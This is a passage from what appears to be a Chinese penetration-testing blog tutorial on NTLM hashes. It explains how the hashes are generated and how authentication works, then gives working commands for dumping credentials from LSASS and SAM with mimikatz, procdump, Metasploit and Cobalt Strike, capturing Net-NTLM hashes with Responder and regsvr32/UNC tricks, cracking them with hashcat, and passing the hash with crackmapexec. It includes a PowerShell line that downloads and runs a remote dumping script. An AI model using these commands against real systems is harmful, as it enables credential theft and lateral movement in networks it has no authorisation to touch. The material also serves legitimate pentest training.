class="line">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</span><br></pre></td></tr></table></figure><h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h4><p>用户密码为<code>test123</code></p><p>转换成十六进制的格式为<code>74657374313233</code></p><p>转换成Unicode格式为<code>7400650073007400310032003300</code></p><p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p><p><strong>注：</strong></p><p>MD4加密可使用工具HashCalc，如下图</p><p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p><p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p><blockquote><p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p></blockquote><p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p><p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p><p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p><p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p><blockquote><p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p></blockquote><p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br></pre></td></tr></table></figure><h3 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h3><h5 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h5><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于工作组和域环境下<code>登录场景的身份认证</code>。</p><h4 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h4><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p><p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p><blockquote><p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p></blockquote><p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p><ul><li><strong>协商</strong>：主要用于确认双方协议版本</li><li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li><li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li></ul><p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p><p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p><p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\<span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>\$share /u:administrator password</span><br></pre></td></tr></table></figure><p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p><p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p><p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p><blockquote><p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，NTML认证机制参与认证过程。此部分详细内容请参考<a href="">域渗透之Kerberos</a> 。</p></blockquote><p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p><h4 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h4><p>工作组中，涉及Clinet、Server，流程如下：</p><ul><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li><li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ul><h4 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h4><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p><blockquote><ol><li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85).aspx" target="_blank" rel="noopener"><em>hash</em></a> of the password and discards the actual password.</li><li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85).aspx" target="_blank" rel="noopener"><em>plaintext</em></a>).</li><li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>nonce</em></a>, and sends it to the client.</li><li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li><li>The server sends the following three items to the domain controller:<ul><li>User name</li><li>Challenge sent to the client</li><li>Response received from the client</li></ul></li><li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li><li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li></ol></blockquote><p>翻译过来流程大致如下：</p><ol><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li><li>服务器将<strong><em>Username、Challenge、Response\</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)\</em></strong></li><li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)\</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ol><h3 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h3><h5 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h5><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p><blockquote><p>大部分这种本地抓取hash的工具都需要管理员权限</p></blockquote><p>常用工具：</p><ul><li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p></li><li><p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></p></li><li><p><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></p></li><li><p><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></p></li><li><p>Cobaltstrike</p></li><li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quarkspwdump.exe -dhl</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>更方便的mimikatz命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords full"</span></span><br></pre></td></tr></table></figure><p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span><span class="built_in">log</span> sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li></ul><p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span>); <span class="string">"Get-Process lsass | Out-Minidump"</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li></ul><p>首先需要获取<code>SYSTEM</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure><p><code>metasploit</code>提供的抓取hash的一些模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p><p>顺便介绍一些能够直接获取明文密码的模块命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest （kerberos）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords </span><br><span class="line"></span><br><span class="line">meterpreter&gt;load kiwi</span><br><span class="line">meterpreter&gt; creds_wdigest</span><br></pre></td></tr></table></figure><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">beacon&gt; </span>getuid</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell-<span class="meta">import</span> /root/powershell/<span class="meta">Get</span>-PassHashes.ps1</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell <span class="meta">Get</span>-PassHashes</span><br></pre></td></tr></table></figure><p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; wdigest //读取信息</span><br><span class="line">beacon&gt; hashdump</span><br></pre></td></tr></table></figure><p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; logonpasswords</span><br></pre></td></tr></table></figure><p>右击受害者主机–access-hashdump</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1</span><br><span class="line">beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure><h4 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h4><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p><p>常用工具：</p><ul><li>Responder</li><li>Metasploit</li></ul><h5 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h5><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure><p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure><p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Challenge</span> = <span class="number">1122334455667788</span></span><br></pre></td></tr></table></figure><p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p><p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p><p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p><ul><li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li><li>钓鱼文档：doc、docx、pdf</li><li>后门设置：</li></ul><p>例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /i:<span class="comment">//17.10.0.1/@abc hello.dll</span></span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">powershell -nop -exec bypass -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">Invoke-Item \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Get-Content \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Start-Process \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br></pre></td></tr></table></figure><h5 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h5><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p><p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">花式窃取NetNTLM哈希的方法</a></p><h3 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h3><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p><h4 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h4><h5 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h5><p>下面是一些提供在线解密的站点：</p><ul><li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li><li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li><li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li><li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li><li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li></ul><h5 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h5><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p><h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p><p><code>-m</code>  hash类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600</span><br></pre></td></tr></table></figure><p>NTLMv1的格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>构造后的数据如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</span><br></pre></td></tr></table></figure><p>Hashcat参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure><p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><blockquote><p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p></blockquote><h4 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h4><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p><p>常用<code>Pass-The-Hash</code>工具： </p><ul><li>Crackmapexec</li><li>Mimikatz</li><li>smbmap</li><li>smbexec</li><li>metasploit</li><li>cobaltstrike</li></ul><h5 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h5><p>1.安装 crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br><span class="line">(pip install crackmapexec)</span><br></pre></td></tr></table></figure><p>2.使用 crackmapexec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb -h</span><br></pre></td></tr></table></figure><p>批量扫描探测命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span> -u administrator -H hash.txt</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.100</span><span class="number">-200</span> -u administrator -H AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -p toor(明文密码) -x whoami</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami</span><br></pre></td></tr></table></figure><p>其他参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">--shares    <span class="comment">#枚举共享和访问权限</span></span><br><span class="line">--sessions    <span class="comment">#枚举活动会话</span></span><br><span class="line">--disks        <span class="comment">#枚举磁盘</span></span><br><span class="line">--sam         <span class="comment">#dump目标系统中的SAM哈希值</span></span><br><span class="line">--loggedon-users    <span class="comment">#枚举登录用户</span></span><br><span class="line">--users [USER]        <span class="comment">#枚举域用户(如果指定了用户只查询其信息)</span></span><br><span class="line">--groups [GROUP]        <span class="comment">#枚举域组(如果指定了组其成员被列举)</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]  <span class="comment">#如果指定了组则枚举本地组其成员被列举</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]    <span class="comment">#枚举本地组，如果指定了组，则枚举其成员</span></span><br><span class="line">-x COMMAND                <span class="comment">#执行指定的命令</span></span><br><span class="line">-X PS_COMMAND            <span class="comment">#执行指定的PowerShell命令</span></span><br><span class="line"></span><br><span class="line">-L， --list-modules    <span class="comment">#列出可用的拓展功能模块</span></span><br><span class="line">--options    <span class="comment">#查看模块选项</span></span><br><span class="line">-M MODULE， --module MODULE     <span class="comment">#使用拓展功能模块</span></span><br><span class="line">-o MODULE_OPTION [MODULE_OPTION ...] <span class="comment">#设置模块选项</span></span><br></pre></td></tr></table></figure><p>GETSHELL</p><p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2<span class="number">.7</span>/dist-packages/crackmapexec<span class="number">-4.0</span><span class="number">.1</span>.dev0-py2<span class="number">.7</span>.egg/cme/modules</span><br></pre></td></tr></table></figure><p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 